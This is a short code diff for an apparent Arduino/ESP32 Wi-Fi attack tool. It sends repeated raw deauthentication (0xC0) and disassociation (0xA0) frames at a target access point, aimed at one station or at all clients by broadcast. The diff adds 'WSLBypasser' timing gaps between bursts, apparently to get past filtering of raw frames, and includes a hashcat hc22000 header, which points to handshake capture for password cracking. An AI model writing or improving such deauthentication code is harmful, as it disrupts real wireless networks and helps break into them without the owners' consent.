@@ -1,5 +1,6 @@
 #include "method_ctx.h"
 #include "../hc22000.h"
+#include "../../core/wsl_bypasser.h"
 #include <Arduino.h>
 #include <string.h>
 
@@ -30,12 +31,16 @@ void ours(const Ctx& ctx) {
         if (ctx.kickStaOk && memcmp(ctx.kickBssid, b.bssid, 6) == 0) {
             for (uint8_t r = 0; r < rounds; r++) {
                 ctx.sendRawMgmt(0xC0, b.bssid, ctx.kickSta);
+                delay(WSLBypasser::burstLegGapMs());
                 ctx.sendRawMgmt(0xA0, b.bssid, ctx.kickSta);
+                if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
             }
         } else {
             for (uint8_t r = 0; r < rounds; r++) {
                 ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
+                delay(WSLBypasser::burstLegGapMs());
                 ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
+                if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
             }
         }
         yield();
